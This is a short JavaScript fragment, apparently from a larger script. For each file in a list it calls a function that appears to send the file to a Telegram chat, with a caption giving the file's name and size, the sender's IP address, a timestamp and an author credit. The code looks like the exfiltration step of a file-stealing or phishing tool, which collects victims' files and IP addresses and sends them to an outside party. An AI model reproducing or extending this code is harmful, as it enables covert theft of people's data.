const f=fs[i];
tgSendFile(f,`📁 <b>${f.name}</b>\n📏 ${(f.size/1024).toFixed(1)} KB\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
